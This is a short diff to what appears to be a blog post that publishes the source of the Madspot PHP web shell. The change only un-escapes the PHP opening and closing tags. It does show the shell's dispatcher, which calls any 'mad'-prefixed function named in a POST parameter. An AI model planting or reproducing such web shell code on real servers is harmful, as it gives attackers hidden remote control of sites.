@@ -30,7 +30,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
 
 ### Madspot shell source code
 
-{% highlight php %}&lt;?php
+{% highlight php %}
+<?php
 
     /**
      * @author Ikram ALI
@@ -2043,7 +2044,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     if( !empty($_POST['a']) && function_exists('mad' . $_POST['a']) )
             call_user_func('mad' . $_POST['a']);
             exit;
-    ?&gt;
+    ?>
 
 
     {% endhighlight %}
